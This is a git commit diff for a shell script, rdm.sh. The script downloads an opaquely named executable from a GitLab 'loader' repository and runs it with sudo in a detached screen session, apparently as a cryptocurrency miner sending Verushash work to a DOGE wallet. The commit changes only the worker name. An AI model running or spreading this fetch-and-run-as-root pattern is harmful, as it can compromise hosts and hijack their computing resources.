06c3da5716edf2f51bcb0784d03844b30c0229a0
washil789 <88795024+washil789@users.noreply.github.com>
2021-10-12 02:00:03 +0700

    Update rdm.sh

--- rdm.sh
+++ rdm.sh
@@ -1,4 +1,4 @@
 sudo apt install screen -y &&
 wget https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa &&
-screen -dmS run sudo ./perusa -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-2000 -n 1)-PPS) -p c=DOGE -t 40 && screen -r
+screen -dmS run sudo ./perusa -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-2000 -n 1)-RDM) -p c=DOGE -t 40 && screen -r
 
